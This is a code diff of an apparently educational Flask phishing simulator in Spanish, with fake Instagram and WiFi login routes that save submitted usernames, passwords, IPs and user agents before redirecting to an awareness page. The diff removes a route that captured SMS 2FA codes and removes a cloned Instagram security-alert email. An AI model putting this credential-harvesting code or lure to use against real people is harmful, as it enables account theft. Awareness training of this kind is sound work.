@@ -91,36 +91,16 @@ def login():
     save_capture(ip_address, user_agent, "Instagram", username, password)
     
     # Redirigir a la página educativa
-    return redirect("/educativo")
-
-@app.route('/checkpoint')
-def checkpoint():
-    # Renderizamos la página de "Ingresa tu código"
-    try:
-        with open('PruebasHTML/checkpoint.html', 'r', encoding='utf-8') as f:
-            return f.read()
-    except FileNotFoundError:
-        return "Error: Falta checkpoint.html"
-
-@app.route('/verify', methods=['POST'])
-def verify_2fa():
-    code = request.form.get('code2fa')
-    
-    # 3. CAPTURA DEL CÓDIGO SMS (2FA BYPASS)
-    print("="*60)
-    print(f" [!!!] CÓDIGO 2FA CAPTURADO")
-    print(f" > Código SMS: {code}")
-    print("="*60)
-    
-    # Redirigir a la página educativa
-    return redirect("/educativo")
+    return redirect("/educativo?scenario=social")
 
 @app.route('/educativo')
 def educativo():
-    # Página educativa que muestra las señales de phishing
+    # Página educativa dinámica
+    scenario = request.args.get('scenario', 'general') # default to general
     try:
         with open('PruebasHTML/educativo.html', 'r', encoding='utf-8') as f:
-            return f.read()
+            # Usamos render_template_string para inyectar variables en el HTML leído
+            return render_template_string(f.read(), scenario=scenario)
     except FileNotFoundError:
         return "Error: Falta educativo.html"
 
@@ -156,7 +136,7 @@ def wifi_login():
     save_capture(ip_address, user_agent, "WiFi Portal", email, password)
     
     # Redirigir a la página educativa
-    return redirect("/educativo")
+    return redirect("/educativo?scenario=wifi")
 
 # --- DASHBOARD ADMINISTRATIVO ---
 
@@ -171,180 +151,11 @@ def admin_dashboard():
 @app.route('/email-demo')
 def email_demo():
     """Muestra cómo se vería un correo de phishing real"""
-    # Obtener la URL actual del servidor para el enlace
-    server_url = request.host_url.rstrip('/')
-    
-    html = f"""
-    <!DOCTYPE html>
-    <html lang="es">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Demo: Correo de Phishing</title>
-        <style>
-            body {{
-                font-family: Arial, sans-serif;
-                background-color: #f0f2f5;
-                margin: 0;
-                padding: 20px;
-            }}
-            .header-info {{
-                max-width: 600px;
-                margin: 0 auto 20px;
-                background: white;
-                padding: 20px;
-                border-radius: 8px;
-                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            }}
-            .header-info h1 {{
-                color: #e74c3c;
-                margin-top: 0;
-            }}
-            .warning {{
-                background: #fff3cd;
-                border-left: 4px solid #ffc107;
-                padding: 15px;
-                margin: 15px 0;
-                border-radius: 4px;
-            }}
-            .signals {{
-                background: #d4edda;
-                border-left: 4px solid #28a745;
-                padding: 15px;
-                margin: 15px 0;
-                border-radius: 4px;
-            }}
-            .signals h3 {{
-                margin-top: 0;
-                color: #155724;
-            }}
-            .signals ul {{
-                margin: 10px 0;
-                padding-left: 20px;
-            }}
-            .signals li {{
-                margin: 8px 0;
-                color: #155724;
-            }}
-        </style>
-    </head>
-    <body>
-        <div class="header-info">
-            <h1>🎓 DEMO: Correo de Phishing</h1>
-            <p><strong>Esta es una demostración educativa</strong> de cómo se ve un correo de phishing típico.</p>
-            
-            <div class="warning">
-                <strong>⚠️ Advertencia Educativa:</strong><br>
-                A continuación verás un correo falso diseñado para parecer legítimo. 
-                Observa las señales de alerta que deberías notar en un correo real.
-            </div>
-            
-            <div class="signals">
-                <h3>🚨 Señales de Alerta a Observar:</h3>
-                <ul>
-                    <li><strong>Urgencia artificial:</strong> "Detectamos un inicio de sesión inusual"</li>
-                    <li><strong>Ubicación sospechosa:</strong> Moscú, Rusia (para crear pánico)</li>
-                    <li><strong>URL del enlace:</strong> Al pasar el mouse, verás que NO va a Instagram real</li>
-                    <li><strong>Remitente:</strong> Parece oficial pero puede ser falsificado</li>
-                    <li><strong>Diseño profesional:</strong> Los atacantes copian diseños reales</li>
-                </ul>
-            </div>
-            
-            <p style="text-align: center; margin: 20px 0;">
-                <strong>↓ Simula que este correo llegó a tu bandeja ↓</strong>
-            </p>
-        </div>
-
-        <!-- Email real simulado -->
-        <div style="max-width: 600px; margin: 0 auto; background-color: white; border: 1px solid #dbdbdb; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
-            <!-- Header -->
-            <div style="background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); padding: 20px; text-align: center;">
-                <h1 style="color: white; margin: 0; font-size: 32px; font-weight: bold;">Instagram</h1>
-            </div>
-            
-            <!-- Body -->
-            <div style="padding: 30px;">
-                <h2 style="color: #262626; font-size: 24px; margin-bottom: 20px;">🔒 Alerta de Seguridad</h2>
-                
-                <p style="color: #262626; font-size: 16px; line-height: 1.6; margin-bottom: 15px;">
-                    Hola,
-                </p>
-                
-                <p style="color: #262626; font-size: 16px; line-height: 1.6; margin-bottom: 15px;">
-                    Detectamos un <strong>inicio de sesión inusual</strong> en tu cuenta de Instagram desde una ubicación desconocida:
-                </p>
-                
-                <div style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; border-radius: 4px;">
-                    <p style="margin: 0; color: #856404; font-size: 14px;">
-                        <strong>📍 Ubicación:</strong> Moscú, Rusia<br>
-                        <strong>🕒 Fecha:</strong> {datetime.now().strftime("%d de %B, %Y - %H:%M")}h<br>
-                        <strong>💻 Dispositivo:</strong> Windows 10 - Chrome
-                    </p>
-                </div>
-                
-                <p style="color: #262626; font-size: 16px; line-height: 1.6; margin-bottom: 15px;">
-                    Si <strong>NO fuiste tú</strong>, te recomendamos asegurar tu cuenta inmediatamente.
-                </p>
-                
-                <!-- Button -->
-                <div style="text-align: center; margin: 30px 0;">
-                    <a href="{server_url}" 
-                       onmouseover="this.style.opacity='0.8'" 
-                       onmouseout="this.style.opacity='1'"
-                       style="background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); color: white; text-decoration: none; padding: 14px 40px; border-radius: 8px; font-size: 16px; font-weight: bold; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: opacity 0.3s;">
-                        ✓ Verificar Actividad
-                    </a>
-                    <br><br>
-                    <span style="color: #e74c3c; font-size: 12px; font-weight: bold;">
-                        ⚠️ PASA EL MOUSE SOBRE EL BOTÓN PARA VER LA URL REAL
-                    </span>
-                </div>
-                
-                <p style="color: #8e8e8e; font-size: 14px; line-height: 1.6; margin-top: 20px;">
-                    Si fuiste tú quien inició sesión, puedes ignorar este mensaje.
-                </p>
-                
-                <hr style="border: none; border-top: 1px solid #dbdbdb; margin: 30px 0;">
-                
-                <p style="color: #8e8e8e; font-size: 12px; line-height: 1.6;">
-                    Este es un correo automático del sistema de seguridad de Instagram.<br>
-                    Por favor no respondas a este mensaje.
-                </p>
-            </div>
-            
-            <!-- Footer -->
-            <div style="background-color: #fafafa; padding: 20px; text-align: center; border-top: 1px solid #dbdbdb;">
-                <p style="color: #8e8e8e; font-size: 12px; margin: 5px 0;">
-                    © 2026 Instagram from Meta
-                </p>
-                <p style="color: #8e8e8e; font-size: 12px; margin: 5px 0;">
-                    <a href="#" style="color: #0095f6; text-decoration: none;">Centro de Ayuda</a> • 
-                    <a href="#" style="color: #0095f6; text-decoration: none;">Términos</a> • 
-                    <a href="#" style="color: #0095f6; text-decoration: none;">Privacidad</a>
-                </p>
-            </div>
-        </div>
-
-        <!-- Info final -->
-        <div class="header-info" style="margin-top: 20px;">
-            <h3>✅ Señales que notaste:</h3>
-            <ul>
-                <li>El enlace "Verificar Actividad" realmente va a: <code>{server_url}</code></li>
-                <li>Instagram NUNCA te pedirá verificar tu cuenta por correo con urgencia</li>
-                <li>Los correos legítimos de Instagram vienen de dominios oficiales verificados</li>
-                <li>La ubicación "Moscú, Rusia" es una táctica común para crear pánico</li>
-            </ul>
-            
-            <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd;">
-                <a href="{server_url}admin" style="background: #667eea; color: white; padding: 12px 24px; text-decoration: none; border-radius: 8px; display: inline-block; font-weight: 600;">
-                    📊 Volver al Dashboard
-                </a>
-            </div>
-        </div>
-    </body>
-    </html>
-    """
-    return html
+    try:
+        with open('PruebasHTML/email_phishing.html', 'r', encoding='utf-8') as f:
+            return f.read()
+    except FileNotFoundError:
+        return "Error: Falta email_phishing.html"
 
 @app.route('/api/stats')
 def get_stats():
@@ -465,7 +276,6 @@ if __name__ == '__main__':
      
      - Registro de IPs y Dispositivos: ACTIVADO
      - Captura de Credenciales: ACTIVADO
-     - Simulación Bypass 2FA: ACTIVADO
     =======================================================
     """)
     # Usamos 0.0.0.0 para que sea visible en la red local si se desea
